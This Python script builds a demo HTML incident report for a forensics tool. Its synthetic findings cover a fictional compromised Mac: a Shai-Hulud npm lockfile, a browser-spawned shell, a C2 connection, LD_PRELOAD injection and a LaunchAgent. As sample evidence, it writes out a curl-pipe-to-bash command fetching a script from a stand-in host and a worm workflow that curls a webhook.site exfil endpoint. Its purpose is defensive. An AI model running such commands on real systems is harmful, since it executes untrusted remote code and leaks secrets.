"""Generate docs/sample-report.html from a synthetic, representative case.

Run via:
    python docs/_build_sample_report.py

The output is a full HTML report — same renderer digger uses in production
— rendered against a hand-curated set of artifacts and findings designed
to showcase what an analyst sees on a moderately-compromised host. No
real evidence is included.
"""

from __future__ import annotations

import shutil
import tempfile
from pathlib import Path

from digger.core import Artifact, EvidenceStore, Finding
from digger.report import render_html


DEMO_HOST = {
    "os": "macos",
    "platform": "macOS-15.1-arm64-arm-64bit",
    "machine": "arm64",
    "node": "demo-laptop",
    "python": "3.12.1",
    "release": "15.1",
    "version": "Darwin Kernel Version 24.1.0",
    "processor": "arm",
    "admin": False,
}


def _seed(case_dir: Path) -> EvidenceStore:
    store = EvidenceStore(case_dir)
    store.set_meta("case_id", "demo-case-2026-05-20")
    store.set_meta("host", DEMO_HOST)
    store.set_meta("classification", "UNCLASSIFIED")
    store.set_meta("tlp", "TLP:AMBER")
    store.set_meta("collection_started", 1747780000.0)
    store.set_meta("collection_finished", 1747780042.0)

    # Artifacts referenced by findings below
    parent_uuid = store.add_artifact(Artifact(
        collector="processes", category="process", subject="pid=1487 chrome",
        data={"pid": 1487, "ppid": 1, "name": "Google Chrome",
              "exe": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
              "cmdline": ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"],
              "username": "analyst", "create_time": 1747779600.0},
    ))
    shell_uuid = store.add_artifact(Artifact(
        collector="processes", category="process", subject="pid=2204 bash",
        data={"pid": 2204, "ppid": 1487, "name": "bash", "exe": "/bin/bash",
              "cmdline": ["/bin/bash", "-c",
                          "curl -fsSL https://wbn.example.io/install.sh | bash"],
              "username": "analyst", "create_time": 1747779950.0},
    ))
    npm_uuid = store.add_artifact(Artifact(
        collector="npm_packages", category="inventory", subject="npm:/Users/analyst/code/frontend",
        data={"project": "/Users/analyst/code/frontend",
              "name": "frontend", "version": "1.4.2",
              "locked_packages": {"chalk": "5.6.1", "debug": "4.4.2",
                                  "@ctrl/tinycolor": "4.1.1",
                                  "ansi-styles": "6.2.2",
                                  "react": "19.0.0"},
              "declared_deps": {"chalk": "^5.0.0", "react": "^19.0.0"},
              "declared_dev_deps": {},
              "declared_scripts": {"build": "vite build", "test": "vitest"},
              "locked_count": 5},
    ))
    workflow_uuid = store.add_artifact(Artifact(
        collector="github_workflows", category="inventory",
        subject="workflows:/Users/analyst/code/frontend/.github/workflows",
        data={"path": "/Users/analyst/code/frontend/.github/workflows",
              "count": 2,
              "entries": [
                  {"name": "shai-hulud-workflow.yml",
                   "path": "/Users/analyst/code/frontend/.github/workflows/shai-hulud-workflow.yml",
                   "size": 2104, "mtime": 1747740000.0,
                   "contents": "name: Shai-Hulud Migration\non: [push]\njobs:\n  run:\n    steps:\n      - run: curl -sL https://webhook.site/0a1b2c3d-e4f5-6789-...\n"},
              ]},
    ))
    network_uuid = store.add_artifact(Artifact(
        collector="network", category="network", subject="ESTABLISHED 10.0.1.5:50203->185.220.101.46:443",
        data={"pid": 2204, "family": "AF_INET", "type": "SOCK_STREAM",
              "laddr": ["10.0.1.5", 50203], "raddr": ["185.220.101.46", 443],
              "status": "ESTABLISHED"},
    ))
    env_uuid = store.add_artifact(Artifact(
        collector="env", category="environment", subject="interesting",
        data={"values": {"LD_PRELOAD": "/tmp/.X11-unix/.libtelemetry.so",
                          "PATH": "/usr/local/bin:/usr/bin:/bin",
                          "USER": "analyst", "SHELL": "/bin/zsh"}},
    ))
    launchd_uuid = store.add_artifact(Artifact(
        collector="macos.launchd", category="persistence",
        subject="launchd:/Users/analyst/Library/LaunchAgents/com.example.helper.plist",
        data={"path": "/Users/analyst/Library/LaunchAgents/com.example.helper.plist",
              "label": "com.example.helper", "mitre": "T1543.001",
              "program_arguments": ["/Users/Shared/.cache/helper", "--daemon"],
              "run_at_load": True, "keep_alive": True},
    ))

    # Findings — a representative mix of severities and detectors
    store.add_finding(Finding(
        detector="suspicious_processes", severity="high",
        title="Shell (bash) spawned by browser (Google Chrome)",
        summary=(
            "PID 2204 (bash) was spawned by browser process Google Chrome. "
            "Browsers should not parent shells; this is characteristic of "
            "post-exploitation via a malicious extension or compromised renderer."
        ),
        artifact_refs=[shell_uuid, parent_uuid],
        evidence={"cmdline": "/bin/bash -c 'curl -fsSL https://wbn.example.io/install.sh | bash'",
                  "pid": 2204, "ppid": 1487},
        mitre="T1059",
        triage={
            "verdict": "likely_malicious",
            "estimative_probability": "very likely",
            "analytic_confidence": "moderate",
            "source_reliability": "A",
            "info_credibility": "2",
            "tlp": "TLP:AMBER",
            "severity": "high",
            "one_line": "Chrome→bash with curl|bash pattern strongly suggests post-exploitation through a renderer or extension",
            "rationale": (
                "Observed: bash process with parent PID 1487 (Google Chrome) and a command line that "
                "pipes a remote-downloaded shell script directly into bash. Browsers do not legitimately "
                "spawn interactive shells; the curl|bash pattern is a textbook dropper. "
                "Inferred: post-exploitation via a malicious extension or a compromised renderer "
                "tab. Source reliability is high (deterministic OS API); information credibility is "
                "moderate pending corroboration with browser-extension audit."
            ),
            "assumptions": [
                "The user did not deliberately run the curl|bash command in a terminal embedded in the browser (e.g. a Chrome devtools terminal extension).",
                "The Chrome process is the actual Google Chrome and not a renamed dropper.",
            ],
            "alternative_hypotheses": [
                "H1: legitimate developer testing of an install script via a browser-launched terminal extension — evidence would be a corresponding extension grant.",
                "H2: targeted phishing-to-shell via a malicious browser extension or content-script.",
                "H3: compromised tab via in-the-wild renderer 0-day (rare, but assess given recent Chromium advisories).",
            ],
            "next_steps": [
                "Preserve volatile state: `lsof -p 2204`, `proc info 2204`, and `kill -STOP 2204` (do not kill yet).",
                "Audit installed Chrome extensions: chrome://extensions/ and `chrome --enable-logging --vmodule=*extension*=2`.",
                "Pull the install.sh from the captured URL in a sandbox and inspect.",
                "Run `digger loki scan` to cross-check against signature-base IOCs.",
                "Rotate any tokens that were in env vars on this shell (see env_hijack finding).",
            ],
            "attribution": None,
            "iocs": {"url": ["https://wbn.example.io/install.sh"], "path": [], "sha256": [], "ipv4": [], "domain": ["wbn.example.io"]},
            "mitre_attack": ["T1059.004", "T1105"],
            "compliance_impact": ["NIST 800-53 SI-4", "NIST 800-53 SI-7", "SOC 2 CC6.6", "ISO 27001 A.8.16"],
        },
    ))

    store.add_finding(Finding(
        detector="shai_hulud", severity="critical",
        title="Shai-Hulud compromised package: chalk@5.6.1",
        summary=(
            "Project /Users/analyst/code/frontend has compromised npm package chalk@5.6.1 in its "
            "lockfile. This package version is listed as part of the Shai-Hulud npm worm campaign. "
            "Treat the host as potentially compromised: rotate tokens, audit recent `npm publish` "
            "activity, and inspect for the worm workflow file."
        ),
        artifact_refs=[npm_uuid],
        evidence={"project": "/Users/analyst/code/frontend", "package": "chalk@5.6.1"},
        mitre="T1195.002",
        triage={
            "verdict": "confirmed_malicious",
            "estimative_probability": "almost certain",
            "analytic_confidence": "high",
            "source_reliability": "A",
            "info_credibility": "1",
            "tlp": "TLP:AMBER",
            "severity": "critical",
            "one_line": "chalk@5.6.1 lockfile entry matches the Shai-Hulud worm; rotate tokens immediately",
            "rationale": (
                "Observed: package-lock.json pins chalk@5.6.1, a version on the Shai-Hulud "
                "compromised-package list (multiple corroborating sources: Aikido, StepSecurity, Socket.dev). "
                "Inferred: any `npm install` that ran in this project may have executed the worm's "
                "post-install script, which exfiltrates env-var secrets to webhook.site and attempts to "
                "self-propagate by publishing malicious versions of the user's own packages."
            ),
            "assumptions": [
                "The compromised version was actually installed (npm install was run after the lockfile was generated).",
                "The user's NPM session has publish rights on at least one package.",
            ],
            "alternative_hypotheses": [
                "H1: lockfile was updated but `npm install` was never run — no execution occurred; remove and re-resolve.",
                "H2: lockfile was carried forward from a pre-compromise window — same remediation but lower urgency.",
            ],
            "next_steps": [
                "Immediately revoke the user's NPM_TOKEN and any GitHub PATs accessible from this shell session.",
                "Audit recent `npm publish` activity on the user's account at https://www.npmjs.com/settings/<user>/packages.",
                "Inspect for the worm-installed `.github/workflows/shai-hulud-workflow.yml` — see the next finding.",
                "Delete node_modules, remove the compromised version from package-lock.json, re-run `npm install --ignore-scripts`.",
                "Run `trufflehog` against the affected repo to find any leaked credentials.",
            ],
            "attribution": "Shai-Hulud npm worm campaign (multi-actor, first wave Sep 2025)",
            "iocs": {"sha256": [], "ipv4": [], "domain": ["webhook.site"], "url": [], "path": ["/Users/analyst/code/frontend/node_modules/chalk/package.json"]},
            "mitre_attack": ["T1195.002"],
            "compliance_impact": ["NIST 800-53 SI-2", "NIST 800-53 SI-7", "NIST 800-171 3.14.1", "SOC 2 CC7.1", "SOC 2 CC9.2", "ISO 27001 A.8.8", "NIS 2 Art-21-d"],
        },
    ))

    store.add_finding(Finding(
        detector="shai_hulud", severity="critical",
        title="Shai-Hulud worm workflow artifact: /Users/analyst/code/frontend/.github/workflows/shai-hulud-workflow.yml",
        summary=(
            "GitHub Actions workflow file matches the worm's filename signature and "
            "references the canonical webhook.site exfil endpoint. This is the "
            "self-propagation vehicle of the Shai-Hulud worm."
        ),
        artifact_refs=[workflow_uuid],
        evidence={"path": "/Users/analyst/code/frontend/.github/workflows/shai-hulud-workflow.yml",
                  "bad_name": True,
                  "markers": ["shai-hulud", "webhook.site"]},
        mitre="T1199",
    ))

    store.add_finding(Finding(
        detector="env_hijack", severity="high",
        title="LD_PRELOAD set in environment",
        summary=(
            "LD_PRELOAD is set to '/tmp/.X11-unix/.libtelemetry.so'. This forces the "
            "dynamic linker to load an attacker-controlled library into every spawned "
            "process. Almost never legitimate on user desktops."
        ),
        artifact_refs=[env_uuid],
        evidence={"var": "LD_PRELOAD", "value": "/tmp/.X11-unix/.libtelemetry.so"},
        mitre="T1574.006",
    ))

    store.add_finding(Finding(
        detector="persistence_outlier", severity="high",
        title="Persistence entry references /Users/Shared/.cache/",
        summary=(
            "LaunchAgent com.example.helper executes /Users/Shared/.cache/helper as a daemon. "
            "Persistence entries should not reference world-shared scratch space."
        ),
        artifact_refs=[launchd_uuid],
        evidence={"subject": "launchd:/Users/analyst/Library/LaunchAgents/com.example.helper.plist",
                  "match": "/Users/Shared/"},
        mitre="T1543.001",
    ))

    store.add_finding(Finding(
        detector="c2", severity="critical",
        title="Live ThreatFox IP match: 185.220.101.46",
        summary=(
            "Established connection to 185.220.101.46:443 matches a live ThreatFox "
            "indicator. Treat as confirmed command-and-control infrastructure."
        ),
        artifact_refs=[network_uuid],
        evidence={"ip": "185.220.101.46", "raddr": ["185.220.101.46", 443]},
        mitre="T1071",
    ))

    store.add_finding(Finding(
        detector="network_anomaly", severity="info",
        title="External connection to 185.220.101.46:443",
        summary="Established connection to public address 185.220.101.46:443 from PID 2204 (bash).",
        artifact_refs=[network_uuid],
        evidence={"raddr": ["185.220.101.46", 443], "pid": 2204},
        mitre="T1071",
    ))

    # Case-wide AI executive summary
    store.set_meta("ai_case_summary", {
        "overall_severity": "critical",
        "overall_estimative_probability": "almost certain",
        "overall_confidence": "high",
        "tlp": "TLP:AMBER",
        "one_paragraph": (
            "demo-laptop has converging evidence of active compromise. A lockfile in "
            "/Users/analyst/code/frontend pins chalk@5.6.1, a known-bad version of the "
            "Shai-Hulud npm worm campaign, and the worm's signature workflow file "
            "(shai-hulud-workflow.yml) is present alongside it. A bash process spawned by "
            "Chrome is curl-piping a remote script into a shell. Outbound traffic from that "
            "shell terminates at 185.220.101.46, an IP currently listed in abuse.ch ThreatFox. "
            "LD_PRELOAD is set to a path under /tmp, which would inject an attacker-controlled "
            "library into every newly-launched process. A LaunchAgent references a binary "
            "under /Users/Shared/.cache/. Either the host has been compromised, or this is "
            "an extremely well-staged false positive."
        ),
        "key_judgments": [
            {"label": "almost certain", "text": "The host has at least one active compromise vector (Shai-Hulud lockfile + worm workflow file)."},
            {"label": "very likely", "text": "An interactive shell is communicating with C2 infrastructure (ThreatFox-listed IP)."},
            {"label": "likely", "text": "LD_PRELOAD injection is part of the same compromise chain rather than coincidental misconfiguration."},
        ],
        "assumptions": [
            "ThreatFox listing is recent (<24h) and not a stale entry.",
            "The Chrome process is the actual Google Chrome and not a renamed dropper.",
        ],
        "alternative_explanations": [
            "A defensive engineer is staging IOCs locally for testing — would be confirmed by a deployment ticket or a /etc/digger-test marker file.",
            "Lockfile is stale from a pre-compromise window, no install was run after the bad chalk version was published — would show no compromised files in node_modules.",
        ],
        "top_actions": [
            "Isolate the host from the network (yank cable, disable Wi-Fi).",
            "Revoke NPM_TOKEN and any GitHub PATs the user has used recently.",
            "Snapshot the case directory: `digger pqc sign --case-dir ...` for evidence integrity before further action.",
            "Capture volatile state: process memory, open sockets, ARP cache, before reboot.",
            "Audit recent `npm publish` activity at the user's NPM account.",
            "Engage internal IR or external response retainer; this is a multi-vector intrusion.",
        ],
        "if_compromised": "Treat as a confirmed worm-driven supply-chain compromise. Assume credential theft has occurred. Rotate every secret in scope before reconnecting to the network.",
        "attribution_hint": "Shai-Hulud npm worm (community-attributed; multi-actor)",
        "iocs_to_share": {
            "sha256": [],
            "ipv4": ["185.220.101.46"],
            "domain": ["wbn.example.io", "webhook.site"],
            "url": ["https://wbn.example.io/install.sh"],
            "path": ["/tmp/.X11-unix/.libtelemetry.so", "/Users/Shared/.cache/helper",
                     "/Users/analyst/code/frontend/.github/workflows/shai-hulud-workflow.yml"],
        },
        "compliance_implications": [
            "SOC 2 CC6.6 (external threat protection)",
            "SOC 2 CC6.8 (malicious software protection)",
            "SOC 2 CC7.1 (vulnerability monitoring)",
            "SOC 2 CC9.2 (vendor / supply-chain risk)",
            "NIST 800-53 SI-2, SI-3, SI-4, SI-7",
            "NIST 800-171 3.14.1, 3.14.2, 3.14.6",
            "ISO 27001 A.8.7, A.8.8, A.8.16",
            "NIS 2 Article 21(d) — supply-chain security",
        ],
    })

    return store


def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        case_dir = Path(tmp) / "demo-case"
        store = _seed(case_dir)
        html = render_html(store)
        store.close()
        out = Path(__file__).parent / "sample-report.html"
        out.write_text(html, encoding="utf-8")
        print(f"wrote {out}  ({out.stat().st_size:,} bytes)")


if __name__ == "__main__":
    main()
